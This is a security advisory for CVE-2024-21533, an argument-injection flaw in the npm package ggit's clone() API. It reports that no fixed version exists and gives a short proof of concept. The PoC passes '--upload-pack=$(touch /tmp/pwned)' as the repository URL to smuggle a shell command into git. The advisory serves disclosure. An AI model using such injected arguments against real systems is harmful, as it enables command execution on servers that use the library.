[CVE-2024-21533  (opens in a new tab)](https://www.cve.org/CVERecord?id=CVE-2024-21533) Common Vulnerabilities and Exposures (CVE) are common identifiers for publicly known security vulnerabilities[CWE-88  (opens in a new tab)](https://cwe.mitre.org/data/definitions/88.html) Common Weakness Enumeration (CWE) is a category system for software weaknesses First added by Snyk
## How to fix?

There is no fixed version for `ggit`.

## Overview

Affected versions of this package are vulnerable to Arbitrary Argument Injection via the `clone()` API, which allows specifying the remote URL to clone and the file on disk to clone to. The library does not sanitize for user input or validate a given URL scheme, nor does it properly pass command-line flags to the `git` binary using the double-dash POSIX characters (`--`) to communicate the end of options.

## PoC

```
const clone = require("ggit").cloneRepo;
clone({
  url: "--upload-pack=$(touch /tmp/pwned)",
  folder: "/tmp/dbd",
}).then(function () {
  console.log("cloned repo to destination folder");
});

```
